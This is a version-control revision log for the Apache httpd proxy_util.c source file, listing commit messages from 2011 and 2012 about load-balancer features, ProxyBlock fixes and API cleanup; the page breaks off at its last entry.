([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1386578&r2=1387110&diff_format=h))
```
Persist local balancer-manager changes across restart/graceful.

```

---

Revision [**1386578**](/viewvc?view=revision&revision=1386578) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1386578&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1386578&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1386578))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1386578)

Modified
*Mon Sep 17 12:22:33 2012 UTC*
(12 years, 4 months ago)
by *jim*

File length: 94822 byte(s)

Diff to [previous 1386576](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1386576&r2=1386578)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1386576&r2=1386578&diff_format=h))
```
Don't just willy nilly slurp double slashes... just handle
the end-case where a '//' is not intended (due to how
PPR is stored)

```

---

Revision [**1386576**](/viewvc?view=revision&revision=1386576) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1386576&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1386576&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1386576))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1386576)

Modified
*Mon Sep 17 12:11:45 2012 UTC*
(12 years, 4 months ago)
by *jim*

File length: 94979 byte(s)

Diff to [previous 1383490](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1383490&r2=1386576)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1383490&r2=1386576&diff_format=h))
```
When concatting for PPR, avoid cases where we
concat ".../" and "/..." to create "...//..."

```

---

Revision [**1383490**](/viewvc?view=revision&revision=1383490) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1383490&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1383490&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1383490))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1383490)

Modified
*Tue Sep 11 17:39:32 2012 UTC*
(12 years, 4 months ago)
by *jim*

File length: 94530 byte(s)

Diff to [previous 1365479](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365479&r2=1383490)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365479&r2=1383490&diff_format=h))
```
Avoid the overhead of creating and grabbing a uuid for
the balancer nonce if we're never going to use it.

```

---

Revision [**1365479**](/viewvc?view=revision&revision=1365479) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365479&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365479&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1365479))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1365479)

Modified
*Wed Jul 25 07:28:26 2012 UTC*
(12 years, 6 months ago)
by *jorton*

File length: 94395 byte(s)

Diff to [previous 1365029](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365029&r2=1365479)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365029&r2=1365479&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_location_reverse_map): Fix
  to skip balancer:// prefix where applicable.

Reviewed by: rjung, rpluem
PR: 45434 (regressed since 2.2)

```

---

Revision [**1365029**](/viewvc?view=revision&revision=1365029) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365029&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365029&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1365029))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1365029)

Modified
*Tue Jul 24 13:01:13 2012 UTC*
(12 years, 6 months ago)
by *jorton*

File length: 94365 byte(s)

Diff to [previous 1365020](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365020&r2=1365029)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365020&r2=1365029&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_checkproxyblock): Add error
  handling for apr_sockaddr_ip_getbuf(), minor code style tweaks.

```

---

Revision [**1365020**](/viewvc?view=revision&revision=1365020) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365020&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365020&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1365020))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1365020)

Modified
*Tue Jul 24 12:54:38 2012 UTC*
(12 years, 6 months ago)
by *jorton*

File length: 94353 byte(s)

Diff to [previous 1365001](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365001&r2=1365020)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1365001&r2=1365020&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_checkproxyblock): Fix memory
  leak/thread-unsafe use of pconf.

Submitted by: rpluem, jorton

```

---

Revision [**1365001**](/viewvc?view=revision&revision=1365001) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365001&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1365001&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1365001))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1365001)

Modified
*Tue Jul 24 12:17:00 2012 UTC*
(12 years, 6 months ago)
by *jorton*

File length: 94315 byte(s)

Diff to [previous 1361801](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1361801&r2=1365001)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1361801&r2=1365001&diff_format=h))
```
Fix handling of ProxyBlock if a forward proxy is configured, and fix
mod_proxy_connect to avoid an inappropriate DNS lookup:

* modules/proxy/proxy_util.c (ap_proxy_checkproxyblock): Take hostname
  argument, make address argument optional.  Check names against
  hostname arg, omit if addr not given.
  (ap_proxy_determine_connection): Adjust for the above; pass hostname
  from URI not the next hop.

* modules/proxy/mod_proxy_ftp.c (proxy_ftp_handler): Adjust for
  ap_proxy_checkproxyblock change.

* modules/proxy/mod_proxy_connect.c (proxy_connect_handler): Adjust
  similarly, and avoid the DNS lookup on the request-URI hostname if a
  proxy is used.

* include/ap_mmn.h: Bump MMN.

PR: 43697

```

---

Revision [**1361801**](/viewvc?view=revision&revision=1361801) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1361801&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1361801&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1361801))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1361801)

Modified
*Sun Jul 15 21:14:00 2012 UTC*
(12 years, 6 months ago)
by *sf*

File length: 94154 byte(s)

Diff to [previous 1306409](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1306409&r2=1361801)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1306409&r2=1361801&diff_format=h))
```
Various code clean up

Submitted by: Christophe JAILLET <christophe jaillet wanadoo fr>
PR: 52893

```

---

Revision [**1306409**](/viewvc?view=revision&revision=1306409) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1306409&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1306409&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1306409))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1306409)

Modified
*Wed Mar 28 15:22:40 2012 UTC*
(12 years, 10 months ago)
by *rpluem*

File length: 94176 byte(s)

Diff to [previous 1228766](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1228766&r2=1306409)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1228766&r2=1306409&diff_format=h))
```
* Add the forcerecovery balancer parameter that determines if recovery for
  balancer workers without considering the retry value of workers is enforced.
  There might be cases where an already overloaded backend can get into deeper
  trouble if the recovery of all workers is enforced without considering the
  retry parameter of each worker

```

---

Revision [**1228766**](/viewvc?view=revision&revision=1228766) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1228766&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1228766&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1228766))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1228766)

Modified
*Sun Jan 8 01:40:01 2012 UTC*
(13 years ago)
by *jim*

File length: 94143 byte(s)

Diff to [previous 1227856](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227856&r2=1228766)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227856&r2=1228766&diff_format=h))
```
optimize this... Do strlen() ONLY if we need to check
for overflow.

```

---

Revision [**1227856**](/viewvc?view=revision&revision=1227856) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227856&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227856&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1227856))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1227856)

Modified
*Thu Jan 5 21:50:31 2012 UTC*
(13 years ago)
by *wrowe*

File length: 94042 byte(s)

Diff to [previous 1227855](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227855&r2=1227856)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227855&r2=1227856&diff_format=h))
```
Cure size_t abuse, curse some recent code [recommit good bits from [r1227852](/viewvc?view=revision&revision=1227852)]

```

---

Revision [**1227855**](/viewvc?view=revision&revision=1227855) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227855&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227855&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1227855))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1227855)

Modified
*Thu Jan 5 21:48:21 2012 UTC*
(13 years ago)
by *wrowe*

File length: 93907 byte(s)

Diff to [previous 1227852](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227852&r2=1227855)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227852&r2=1227855&diff_format=h))
```
Revert a whole mess that was not ment to be committed

```

---

Revision [**1227852**](/viewvc?view=revision&revision=1227852) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227852&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227852&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1227852))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1227852)

Modified
*Thu Jan 5 21:43:24 2012 UTC*
(13 years ago)
by *wrowe*

File length: 94042 byte(s)

Diff to [previous 1227642](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227642&r2=1227852)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1227642&r2=1227852&diff_format=h))
```
Cure size_t abuse, curse some recent code

```

---

Revision [**1227642**](/viewvc?view=revision&revision=1227642) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227642&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1227642&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1227642))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1227642)

Modified
*Thu Jan 5 15:45:01 2012 UTC*
(13 years ago)
by *covener*

File length: 93907 byte(s)

Diff to [previous 1220493](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1220493&r2=1227642)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1220493&r2=1227642&diff_format=h))
```
Update the comment and checks around address/connection reusability
in mod_proxy.

The checks and comment are a vestige of 2.0.x
mod_proxy_http where the backend proxy conn was stored in
the frontend r->conn_config, but ap_proxy_determine_connection()
doesn't associate the frontend and backend conns like this.

```

---

Revision [**1220493**](/viewvc?view=revision&revision=1220493) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1220493&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1220493&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1220493))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1220493)

Modified
*Sun Dec 18 17:52:59 2011 UTC*
(13 years, 1 month ago)
by *sf*

File length: 94117 byte(s)

Diff to [previous 1209952](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209952&r2=1220493)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209952&r2=1220493&diff_format=h))
```
Various code cleanup to avoid compiler, cppcheck, or clang warnings:

modules/debugging/mod_firehose.c: Make some internal functions static
                                  (to do: logs_cleanup() is unused)

modules/filters/mod_charset_lite.c: Remove dead assignments

modules/filters/mod_include.c: likewise

modules/metadata/mod_usertrack.c: likewise

modules/proxy/mod_proxy_ftp.c: likewise

modules/ssl/ssl_engine_pphrase.c: likewise

modules/proxy/mod_proxy_balancer.c: likewise;
                                    Remove NULL check that can never happen

modules/proxy/proxy_util.c: Axe NULL-check that can never happen and if it
                            would, it would just mask another bug

os/unix/unixd.c: likewise

modules/http/http_filters.c: Remove sub-condition that is always true

modules/lua/mod_lua.c: Add default cases to switch statements

modules/generators/mod_autoindex.c: Unsigned value can never be < 0

server/util_expr_eval.c: Fix compiler warnings with VC and on OS2

```

---

Revision [**1209952**](/viewvc?view=revision&revision=1209952) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209952&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209952&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209952))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209952)

Modified
*Sat Dec 3 17:09:58 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 94136 byte(s)

Diff to [previous 1209916](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209916&r2=1209952)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209916&r2=1209952&diff_format=h))
```
mod_proxy: Remove dead code ap_proxy_table_unmerge().

```

---

Revision [**1209916**](/viewvc?view=revision&revision=1209916) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209916&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209916&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209916))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209916)

Modified
*Sat Dec 3 14:39:51 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 94855 byte(s)

Diff to [previous 1209910](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209910&r2=1209916)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209910&r2=1209916&diff_format=h))
```
mod_proxy: Remove ap_proxy_make_fake_req() from the public API.

```

---

Revision [**1209910**](/viewvc?view=revision&revision=1209910) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209910&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209910&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209910))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209910)

Modified
*Sat Dec 3 13:38:26 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 95907 byte(s)

Diff to [previous 1209814](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209814&r2=1209910)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209814&r2=1209910&diff_format=h))
```
mod_proxy: Remove dead code.

```

---

Revision [**1209814**](/viewvc?view=revision&revision=1209814) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209814&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209814&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209814))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209814)

Modified
*Sat Dec 3 01:08:59 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 96832 byte(s)

Diff to [previous 1209812](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209812&r2=1209814)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209812&r2=1209814&diff_format=h))
```
mod_proxy: Make sure we populate the client IP from the peer IP for proxy
fake requests.

```

---

Revision [**1209812**](/viewvc?view=revision&revision=1209812) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209812&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209812&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209812))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209812)

Modified
*Sat Dec 3 01:03:08 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 96764 byte(s)

Diff to [previous 1209811](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209811&r2=1209812)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209811&r2=1209812&diff_format=h))
```
mod_proxy: Remove ap_proxy_date_canon() from the public API.

```

---

Revision [**1209811**](/viewvc?view=revision&revision=1209811) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209811&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209811&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209811))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209811)

Modified
*Sat Dec 3 00:57:19 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 97263 byte(s)

Diff to [previous 1209797](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209797&r2=1209811)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209797&r2=1209811&diff_format=h))
```
mod_proxy: Remove ap_proxy_buckets_lifetime_transform() from the public API.

```

---

Revision [**1209797**](/viewvc?view=revision&revision=1209797) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209797&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209797&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209797))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209797)

Modified
*Sat Dec 3 00:30:06 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 99061 byte(s)

Diff to [previous 1209776](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209776&r2=1209797)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209776&r2=1209797&diff_format=h))
```
mod_proxy: Remove ap_proxy_liststr(), it duplicates ap_find_token().

```

---

Revision [**1209776**](/viewvc?view=revision&revision=1209776) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209776&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209776&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209776))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209776)

Modified
*Fri Dec 2 23:18:39 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 99862 byte(s)

Diff to [previous 1209766](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209766&r2=1209776)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209766&r2=1209776&diff_format=h))
```
mod_proxy: Move ap_proxy_string_read() out of the public API into
mod_proxy_ftp.

```

---

Revision [**1209766**](/viewvc?view=revision&revision=1209766) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209766&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209766&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209766))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209766)

Modified
*Fri Dec 2 23:02:04 2011 UTC*
(13 years, 1 month ago)
by *sf*

File length: 102533 byte(s)

Diff to [previous 1209754](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209754&r2=1209766)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1209754&r2=1209766&diff_format=h))
```
Add lots of unique tags to error log messages

```

---

Revision [**1209754**](/viewvc?view=revision&revision=1209754) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209754&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1209754&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1209754))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1209754)

Modified
*Fri Dec 2 22:42:39 2011 UTC*
(13 years, 1 month ago)
by *minfrin*

File length: 101498 byte(s)

Diff to [previous 1208897](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1208897&r2=1209754)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1208897&r2=1209754&diff_format=h))
```
mod_proxy: Make ap_proxy_retry_worker() into an optional function. Allows
mod_lbmethod_bybusyness, mod_lbmethod_byrequests, mod_lbmethod_bytraffic
and mod_lbmethod_heartbeat to be loaded without mod_proxy yet being present,
which happens when modules are loaded in alphabetical order.

```

---

Revision [**1208897**](/viewvc?view=revision&revision=1208897) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1208897&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1208897&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1208897))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1208897)

Modified
*Thu Dec 1 00:02:30 2011 UTC*
(13 years, 1 month ago)
by *jim*

File length: 101453 byte(s)

Diff to [previous 1208069](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1208069&r2=1208897)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1208069&r2=1208897&diff_format=h))
```
Use 2 sep hashing functions to account for collisions...
Safe enough

```

---

Revision [**1208069**](/viewvc?view=revision&revision=1208069) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1208069&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1208069&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1208069))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1208069)

Modified
*Tue Nov 29 21:14:47 2011 UTC*
(13 years, 1 month ago)
by *jim*

File length: 101121 byte(s)

Diff to [previous 1208068](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1208068&r2=1208069)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1208068&r2=1208069&diff_format=h))
```
Ensure casing doesn't matter... (we know balancer->s->name is
lc)

```

---

Revision [**1208068**](/viewvc?view=revision&revision=1208068) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1208068&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1208068&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1208068))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1208068)

Modified
*Tue Nov 29 21:14:08 2011 UTC*
(13 years, 1 month ago)
by *jim*

File length: 101096 byte(s)

Diff to [previous 1207926](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207926&r2=1208068)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207926&r2=1208068&diff_format=h))
```
Some optimization... we have a hash, use it. Quicker than all
these string comparisons.

```

---

Revision [**1207926**](/viewvc?view=revision&revision=1207926) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207926&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207926&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1207926))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1207926)

Modified
*Tue Nov 29 15:36:11 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 101000 byte(s)

Diff to [previous 1207562](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207562&r2=1207926)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207562&r2=1207926&diff_format=h))
```
Logic which makes the balancer "active" or not... so we can turn them
off and on as needed.

```

---

Revision [**1207562**](/viewvc?view=revision&revision=1207562) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207562&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207562&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1207562))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1207562)

Modified
*Mon Nov 28 20:11:44 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 100864 byte(s)

Diff to [previous 1207467](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207467&r2=1207562)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207467&r2=1207562&diff_format=h))
```
Pull this out as a sep function to allow for full vhosting
adjustment between get and define balancers...

```

---

Revision [**1207467**](/viewvc?view=revision&revision=1207467) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207467&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207467&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1207467))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1207467)

Modified
*Mon Nov 28 17:10:17 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 100206 byte(s)

Diff to [previous 1207282](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207282&r2=1207467)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1207282&r2=1207467&diff_format=h))
```
"Final" (I hope) proxy struct/API changes in order to support
dynamic balancer allocation AND dynamic vhost-balancers

```

---

Revision [**1207282**](/viewvc?view=revision&revision=1207282) -
